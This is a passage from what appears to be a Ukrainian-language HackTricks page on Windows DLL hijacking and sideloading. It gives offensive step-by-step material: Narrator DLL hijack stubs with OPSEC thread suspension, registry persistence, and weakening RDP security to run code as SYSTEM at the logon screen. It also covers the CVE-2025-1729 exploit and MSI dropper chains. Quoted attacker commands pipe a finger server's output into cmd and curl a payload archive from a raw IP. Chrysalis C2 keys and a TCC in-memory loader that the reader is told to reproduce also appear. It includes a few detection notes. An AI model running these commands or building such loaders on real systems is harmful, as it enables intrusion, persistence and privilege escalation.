- Запустіть Narrator і спостерігайте за спробою завантажити вказаний вище шлях.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC-тиша
- Наївний hijack озвучуватиме події або підсвічуватиме елементи UI. Щоб залишитися непомітним, під час attach переберіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його через `SuspendThread`; продовжуйте роботу у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Запуск і persistence через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Після цього запуск Narrator завантажить підкладену DLL. На захищеному робочому столі (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на захищеному робочому столі.

Виконання SYSTEM через RDP (lateral movement)
- Увімкніть класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до хоста через RDP і на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на захищеному робочому столі.
- Виконання припиниться після закриття RDP-сесії — швидко виконайте inject/migrate.

Bring Your Own Accessibility (BYOA)
- Можна клонувати запис реєстру вбудованого Accessibility Tool (AT), наприклад CursorIndicator, змінити його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім задати `configuration` рівним назві цього AT. Це дає змогу запускати довільний код через фреймворк Accessibility.

Примітки
- Для запису в `%windir%\System32` і зміни значень HKLM потрібні права адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Приклад: CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe

У цьому прикладі показано **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), що має ідентифікатор **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe` розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Дозволи на каталог**: каталог доступний для запису `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **Поведінка пошуку DLL**: програма спочатку намагається завантажити `hostfxr.dll` із робочого каталогу й записує в журнал "NAME NOT FOUND", якщо файл відсутній. Це вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойту

Зловмисник може розмістити шкідливу заглушку `hostfxr.dll` у тому самому каталозі та скористатися відсутньою DLL, щоб виконати код у контексті користувача:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Потік атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 під обліковим записом поточного користувача.
3. Якщо під час виконання завдання увійшов адміністратор, шкідлива DLL запускається в сеансі адміністратора з середнім рівнем цілісності.
4. Застосуйте ланцюжок стандартних технік обходу UAC, щоб підвищити рівень цілісності із середнього до привілеїв SYSTEM.

## Приклад: дропер MSI CustomAction + DLL Side-Loading через підписаний хост (wsc_proxy.exe)

Зловмисники часто поєднують дропери на основі MSI з DLL side-loading, щоб виконувати payload у довіреному підписаному процесі.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час інсталяції з графічним інтерфейсом CustomAction непомітно запускається (наприклад, LaunchApplication або дія VBScript) і відновлює наступний етап з вбудованих ресурсів.
- Дропер записує легітимний підписаний EXE і шкідливу DLL в один каталог (приклад пари: підписаний Avast `wsc_proxy.exe` + контрольований зловмисником `wsc.dll`).
- Після запуску підписаного EXE порядок пошуку DLL у Windows спочатку завантажує `wsc.dll` з робочого каталогу, виконуючи код зловмисника в підписаному батьківському процесі (ATT&CK T1574.001).

Аналіз MSI (на що звернути увагу)
- Таблиця CustomAction:
  - Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого шаблону: LaunchApplication запускає вбудований файл у фоновому режимі.
  - В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені payloads у CAB-файлі MSI:
  - Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Або скористайтеся lessmsi: lessmsi x package.msi C:\out
  - Шукайте кілька невеликих фрагментів, які об’єднуються й розшифровуються CustomAction на VBScript. Типовий процес:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Практичне sideloading за допомогою wsc_proxy.exe
- Помістіть ці два файли в одну папку:
  - wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за назвою з тієї самої папки.
  - wsc.dll: DLL зловмисника. Якщо конкретні експорти не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте потрібні експорти до справжньої бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Для вимог до експорту використовуйте framework для проксіювання (наприклад, DLLirant/Spartacus), щоб створити forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на визначення імен DLL бінарним файлом-хостом. Якщо хост використовує абсолютні шляхи або прапорці безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет завантаження, тому це слід враховувати під час вибору бінарного файла-хоста й набору експортів.

## Підписані тріади + зашифровані payload-и (розбір ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **тріади з трьох файлів**, щоб маскуватися під легітимне ПЗ і водночас зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний EXE-хост** – зловмисники використовують таких виробників, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Зловмисники перейменовують виконуваний файл так, щоб він був схожий на бінарний файл Windows (наприклад, `conhost.exe`), але підпис Authenticode залишається чинним.
2. **Шкідлива DLL-завантажувач** – розміщується поруч із EXE під очікуваним ім’ям (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є бінарним файлом MFC, обфускованим за допомогою framework ScatterBrain; її єдине завдання – знайти зашифрований blob, розшифрувати його та виконати reflective mapping ShadowPad.
3. **Зашифрований blob payload-а** – часто зберігається в тому самому каталозі як `<name>.tmp`. Після відображення розшифрованого payload-а в пам’ять завантажувач видаляє TMP-файл, щоб знищити криміналістичні докази.

Нотатки щодо tradecraft:

* Перейменування підписаного EXE зі збереженням оригінального `OriginalFileName` у PE-заголовку дає змогу видати його за бінарний файл Windows і водночас зберегти підпис виробника. Тож відтворюйте звичку Ink Dragon розміщувати бінарні файли, схожі на `conhost.exe`, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, для більшості засобів контролю allowlisting достатньо, щоб ваша шкідлива DLL лежала поруч із ним. Зосередьтеся на налаштуванні DLL-завантажувача; підписаний батьківський процес зазвичай можна запускати без змін.
* Дешифратор ShadowPad очікує, що TMP blob лежатиме поруч із завантажувачем і буде доступним для запису, щоб після відображення в пам’ять можна було обнулити файл. Залиште каталог доступним для запису, доки payload не завантажиться; після завантаження в пам’ять TMP-файл можна безпечно видалити з міркувань OPSEC.

### Ланцюжок sideloading із LOLBAS-стейджером і поетапним завантаженням архіву (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, щоб єдиним власним артефактом на диску була шкідлива DLL поруч із довіреним EXE:<sup>[[1]](#references)</sup>

- **Завантажувач віддалених команд (Finger):** прихований PowerShell запускає `cmd.exe /c`, отримує команди із сервера Finger і передає їх у `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, що дає змогу операторам змінювати second stage на сервері.

- **Вбудоване завантаження/розпакування:** Завантажте архів із нешкідливим розширенням, розпакуйте його та розмістіть sideload target і DLL у випадковій папці `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` приховує індикатор виконання та переходить за перенаправленнями; `tar -xf` використовує вбудовану в Windows утиліту tar.

- **Запуск через WMI/CIM:** Запустіть EXE через WMI, щоб у телеметрії відображався процес, створений CIM, під час завантаження ним DLL, розміщеної поруч:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Працює з бінарними файлами, які віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреною назвою.

- **Пошук:** створюйте сповіщення про `forfiles`, якщо одночасно вказано `/p`, `/m` і `/c`; така комбінація рідко трапляється поза адміністративними скриптами.


## Практичний розбір: sideload NSIS dropper + Bitdefender Submission Wizard (Chrysalis)

Під час нещодавнього вторгнення Lotus Blossom зловмисники скористалися довіреним ланцюжком оновлення, щоб доставити упакований NSIS dropper, який розмістив DLL sideload і payload, що повністю працюють у пам’яті.<sup>[[13]](#references)</sup>

Послідовність дій
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, записує перейменований Bitdefender Submission Wizard `BluetoothService.exe`, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його за допомогою потокового шифру на основі власного LCG (константи **0x19660D** / **0x3C6EF35F**, матеріал ключа отримано з попереднього хешу), перезаписує буфер відкритим shellcode, звільняє тимчасові дані й передає йому керування.
- Щоб уникнути IAT, loader знаходить API, хешуючи назви експортів за допомогою **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує avalanche-перетворення в стилі Murmur (**0x85EBCA6B**) і порівнює результат із цільовими хешами з сіллю.

Основний shellcode (Chrysalis)
- Розшифровує PE-подібний основний модуль, повторюючи операції додавання/XOR/віднімання з ключем `gQ2JR&9;` у п’ять проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення розв’язання імпортів.
- Відновлює рядки з назвами DLL під час виконання за допомогою побайтових циклічних зсувів і XOR-перетворень, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить шляхом **PEB → InMemoryOrderModuleList**, аналізує кожну таблицю експортів блоками по 4 байти із застосуванням змішування в стилі Murmur і вдається до `GetProcAddress`, лише якщо хеш не знайдено.

Вбудована конфігурація та C2
- Конфігурація міститься у скинутому файлі `BluetoothService` за **зсувом 0x30808** (розмір **0x980**) і розшифровується RC4 із ключем `qwhvb^435h&*7`, що відкриває URL C2 і User-Agent.
- Beacon формують профіль хоста з компонентів, розділених крапками, додають на початок тег `4Q`, а потім шифрують RC4 із ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді розшифровуються RC4 і спрямовуються на обробку перемикачем тегів (`4T` — shell, `4V` — запуск процесу, `4W/4X` — запис файлу, `4Y` — читання/ексфільтрація, `4\\` — видалення, `4` — перелік дисків/файлів і передавання частинами).
- Режим виконання залежить від аргументів CLI: без аргументів — встановлення persistence (служба/ключ Run) із посиланням на `-i`; `-i` повторно запускає себе з `-k`; `-k` пропускає встановлення й запускає payload.

Помічено альтернативний loader
- Під час того самого вторгнення було скинуто Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, а поруч розміщено `libtcc.dll`. Наданий зловмисником вихідний код C містив shellcode, який компілювався і запускався в пам’яті без запису PE на диск. Відтворіть це так:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- На цьому етапі компіляції та запуску на основі TCC під час виконання імпортувався `Wininet.dll` і завантажувався shellcode другого етапу з жорстко заданої URL-адреси, що забезпечувало гнучкий loader, який маскувався під запуск компілятора.

## Signed-host sideloading with export proxying + host thread parking

Деякі ланцюжки DLL sideloading додають **заходи для підвищення стабільності**, щоб легітимний хост залишався активним достатньо довго для коректного завантаження наступних етапів, а не аварійно завершувався після завантаження шкідливої DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістити довірений EXE поруч зі шкідливою DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Шкідлива DLL **проксіює кожен очікуваний export** до справжньої системної DLL (наприклад, `%SystemRoot%\\System32\\version.dll`), щоб імпорт і далі успішно розв’язувався, а процес хоста продовжував працювати.
- Після завантаження шкідлива DLL **патчить точку входу хоста**, змушуючи головний потік потрапити в нескінченний цикл `Sleep` замість завершення роботи або виконання шляхів коду, які зупинили б процес.
- Новий потік виконує власне шкідливе завдання: розшифровує ім’я чи шлях DLL наступного етапу (часто використовується RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне проксіювання DLL зберігає сумісність API, але не гарантує, що хост працюватиме достатньо довго для наступних етапів.
- Переведення головного потоку в режим очікування за допомогою `Sleep(INFINITE)` — простий спосіб залишити підписаний процес активним, поки loader виконує розшифрування, підготовку payload або початкове мережеве з’єднання в робочому потоці.
- Пошук лише підозрілої `DllMain` може не виявити цей шаблон, якщо підозріла активність починається після патчення точки входу хоста й запуску другого потоку.

Мінімальний робочий процес
1. Скопіювати підписаний EXE хоста й визначити, яку DLL він завантажує з локального каталогу.
2. Створити proxy DLL, яка експортує ті самі функції та перенаправляє виклики до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити робочий потік.
4. У цьому потоці пропатчити точку входу хоста або процедуру запуску головного потоку, щоб він зациклився на `Sleep`.
5. Розшифрувати ім’я/конфігурацію DLL наступного етапу й викликати `LoadLibrary` або вручну відобразити payload у пам’ять.

Напрями для захисного пошуку
- Підписані процеси, які завантажують `version.dll` або подібні поширені бібліотеки з власного каталогу застосунку замість `System32`.
- Патчі пам’яті в точці входу процесу невдовзі після завантаження образу, зокрема переходи/виклики, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Proxy DLL з повним набором export-функцій, розміщені поруч із виконуваними файлами постачальника у доступних для запису каталогах підготовки, як-от `ProgramData`, `%TEMP%` або шляхи розпакованих архівів.

## References

- [1] [Red Canary – Аналітичні огляди розвідданих: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове шкідливе ПЗ, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL hijack зустрічаються з помічниками Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: аналіз еволюції кампаній із видавання себе за інших, що поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Збіг інтересів: аналіз кластерів загроз, націлених на уряд країни Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішньої будови прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Бекдор Chrysalis: детальний огляд інструментарію Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — HTB Bruno: ланцюжок ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження шпигунських кампаній іранської APT Screening Serpens у 2026 році](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Швидко й люто: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії завдань](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру країн Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
